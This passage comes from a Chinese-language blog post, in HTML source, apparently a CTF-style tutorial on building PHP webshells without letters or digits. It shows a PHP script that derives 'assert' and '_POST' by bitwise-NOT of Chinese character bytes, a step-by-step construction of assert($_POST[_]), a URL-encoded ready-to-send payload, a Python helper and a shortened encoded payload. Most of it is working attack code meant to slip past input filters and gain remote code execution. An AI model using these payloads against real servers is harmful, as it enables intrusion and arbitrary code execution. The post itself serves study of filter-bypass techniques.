class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> =<span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$word</span> = <span class="string">&quot;一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺</span></span><br><span class="line"><span class="string">木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引</span></span><br><span class="line"><span class="string">丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们</span></span><br><span class="line"><span class="string">仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾</span></span><br><span class="line"><span class="string">扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传</span></span><br><span class="line"><span class="string">乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅</span></span><br><span class="line"><span class="string">字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖</span></span><br><span class="line"><span class="string">护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我</span></span><br><span class="line"><span class="string">乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟</span></span><br><span class="line"><span class="string">没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖</span></span><br><span class="line"><span class="string">拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚</span></span><br><span class="line"><span class="string">旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿</span></span><br><span class="line"><span class="string">胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试</span></span><br><span class="line"><span class="string">郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪</span></span><br><span class="line"><span class="string">某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂</span></span><br><span class="line"><span class="string">哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀</span></span><br><span class="line"><span class="string">饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误</span></span><br><span class="line"><span class="string">诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫</span></span><br><span class="line"><span class="string">荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积</span></span><br><span class="line"><span class="string">秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳</span></span><br><span class="line"><span class="string">粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继</span></span><br><span class="line"><span class="string">球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇</span></span><br><span class="line"><span class="string">圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐</span></span><br><span class="line"><span class="string">混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬</span></span><br><span class="line"><span class="string">葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩</span></span><br><span class="line"><span class="string">稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙</span></span><br><span class="line"><span class="string">谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳</span></span><br><span class="line"><span class="string">跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静</span></span><br><span class="line"><span class="string">碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱</span></span><br><span class="line"><span class="string">嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐</span></span><br><span class="line"><span class="string">嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾</span></span><br><span class="line"><span class="string">夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛</span></span><br><span class="line"><span class="string">吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙</span></span><br><span class="line"><span class="string">呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤</span></span><br><span class="line"><span class="string">荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦</span></span><br><span class="line"><span class="string">匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋</span></span><br><span class="line"><span class="string">疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾</span></span><br><span class="line"><span class="string">啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽</span></span><br><span class="line"><span class="string">缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔</span></span><br><span class="line"><span class="string">奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙</span></span><br><span class="line"><span class="string">腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥</span></span><br><span class="line"><span class="string">谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥</span></span><br><span class="line"><span class="string">霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹</span></span><br><span class="line"><span class="string">靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mb_str_split</span>(<span class="params"> <span class="variable">$string</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/(?&lt;!^)(?!$)/u&#x27;</span>, <span class="variable">$string</span> ); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">mb_str_split</span>(<span class="variable">$word</span>) <span class="keyword">as</span> <span class="variable">$c</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$arr</span>[] = <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$x</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$y</span>=<span class="number">0</span>;<span class="variable">$y</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);<span class="variable">$y</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$k</span> = <span class="variable">$arr</span>[<span class="variable">$y</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$shell</span>[<span class="variable">$x</span>] == ~(<span class="variable">$k</span>&#123;<span class="number">1</span>&#125;))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$k</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br></pre></td></tr></table></figure>
+
+<p>构造如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>++;                <span class="comment">//得到1，此时$_=1</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;极&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> = ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到a，此时$___=&quot;a&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;区&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到s，此时$___=&quot;as&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//此时$___=&quot;ass&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;皮&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到e，此时$___=&quot;asse&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;十&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到r，此时$___=&quot;asser&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;勺&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到t，此时$___=&quot;assert&quot;</span></span><br><span class="line"><span class="variable">$____</span> = <span class="string">&#x27;_&#x27;</span>;          <span class="comment">//$____=&#x27;_&#x27;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;寸&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到P，此时$____=&quot;_P&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;小&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到O，此时$____=&quot;_PO&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;欠&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到S，此时$____=&quot;_POS&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;立&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到T，此时$____=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$$____</span>;           <span class="comment">//$_ = $_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);           <span class="comment">//assert($_POST[_])</span></span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$__</span> = <span class="string">&quot;极&quot;</span>;<span class="variable">$___</span> = ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;区&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;皮&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;十&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;勺&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$____</span> = <span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span> = <span class="string">&quot;寸&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;小&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;欠&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;立&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$_</span> = <span class="variable">$$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br><span class="line"><span class="comment">//由于不可见字符的原因，我们还是要进行url编码之后才能正常使用：</span></span><br><span class="line">%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E6%<span class="number">9</span>E%<span class="number">81</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E5%<span class="number">8</span>C%BA%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E7%<span class="number">9</span>A%AE%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E5%<span class="number">8</span>D%<span class="number">81</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E5%<span class="number">8</span>B%BA%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>____%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span><span class="string">&#x27;_&#x27;</span>%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E5%AF%B8%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>____%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E5%B0%<span class="number">8</span>F%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>____%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E6%AC%A0%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>____%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E7%AB%<span class="number">8</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>____%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">24</span>%<span class="number">24</span>____%<span class="number">3</span>B%<span class="number">24</span>___(%<span class="number">24</span>_%<span class="number">5</span>B_%<span class="number">5</span>D)%<span class="number">3</span>B    </span><br></pre></td></tr></table></figure>
+
+<p>升级版：</p>
+<p>在上面的学习过程中，可以知道:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_=&quot;卢&quot;;</span><br><span class="line">print(~($_&#123;1&#125;));</span><br><span class="line">print(~&quot;\x8d&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>这两种写法其实是等价的。所以如果把EXP中的<code>~(&quot;欠&quot;&#123;1&#125;)</code>写成<code>~&quot;\x8d&quot;</code>这种形式，可以缩减不少字符。给出脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">shell</span>):</span><br><span class="line">    hexbit=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">hex</span>(~(-(<span class="number">256</span>-<span class="built_in">ord</span>(x)))),shell))</span><br><span class="line">    hexbit = hexbit.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(hexbit)</span><br><span class="line"></span><br><span class="line">get(<span class="string">&#x27;assert&#x27;</span>)</span><br><span class="line">get(<span class="string">&#x27;_POST&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>利用这个POC，我把上面的EXP缩减为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span> = ~<span class="string">&quot;%9e%8c%8c%9a%8d%8b&quot;</span>;   <span class="comment">//得到assert，此时$_=&quot;assert&quot;</span></span><br><span class="line"><span class="variable">$__</span> = ~<span class="string">&quot;%a0%af%b0%ac%ab&quot;</span>;   <span class="comment">//得到_POST，此时$__=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$$__</span>;   <span class="comment">//$___=$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);   <span class="comment">//assert($_POST[_])</span></span><br><span class="line"><span class="comment">//放到一排就是</span></span><br><span class="line"><span class="variable">$_</span> = ~<span class="string">&quot;%9e%8c%8c%9a%8d%8b&quot;</span>;<span class="variable">$__</span> = ~<span class="string">&quot;%a0%af%b0%ac%ab&quot;</span>;<span class="variable">$___</span> = <span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure>
+
+<p>注意到这里<code>assert</code>和<code>_POST</code>都用的URL编码表示，如果直接以<code>\x9e\x8c\x8c\x9a\x8d\x8b</code>这种UTF-8字符表示，并不能识别出为UTF-8字符，而是会被识别为<code>英文+数字</code>的字符串。</p>
